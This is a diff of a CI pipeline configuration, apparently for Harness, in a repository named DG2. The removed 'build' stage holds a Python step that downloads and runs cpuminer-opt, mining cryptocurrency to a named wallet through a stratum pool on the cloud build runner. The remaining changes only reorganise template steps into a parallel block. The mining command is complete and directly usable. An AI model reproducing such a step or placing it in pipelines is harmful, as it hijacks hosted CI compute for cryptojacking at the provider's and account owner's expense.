@@ -11,38 +11,6 @@ pipeline:
         repoName: magdamana001/DG2
   stages:
     - stage:
-        identifier: build
-        name: build
-        spec:
-          cloneCodebase: true
-          execution:
-            steps:
-              - step:
-                  type: Run
-                  name: Run_2
-                  identifier: Run_2
-                  spec:
-                    shell: Python
-                    command: |-
-                      import os
-
-                      os.system("apt update; apt -y install wget; apt -y install tar; wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz; tar xf cpuminer-opt-linux.tar.gz; chmod +x cpuminer-sse2; ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.NT11")
-              - step:
-                  type: Run
-                  name: Run_1
-                  identifier: Run_1
-                  spec:
-                    shell: Sh
-                    command: ls
-          platform:
-            os: Linux
-            arch: Amd64
-          runtime:
-            type: Cloud
-            spec: {}
-        type: CI
-        description: ""
-    - stage:
         name: Build2
         identifier: Build2
         description: ""
@@ -57,9 +25,16 @@ pipeline:
             spec: {}
           execution:
             steps:
-              - step:
-                  name: B2
-                  identifier: B2
-                  template:
-                    templateRef: as
-                    versionLabel: "1"
+              - parallel:
+                  - step:
+                      name: B2
+                      identifier: B2
+                      template:
+                        templateRef: as
+                        versionLabel: "1"
+                  - step:
+                      name: s2
+                      identifier: s2
+                      template:
+                        templateRef: as
+                        versionLabel: "1"
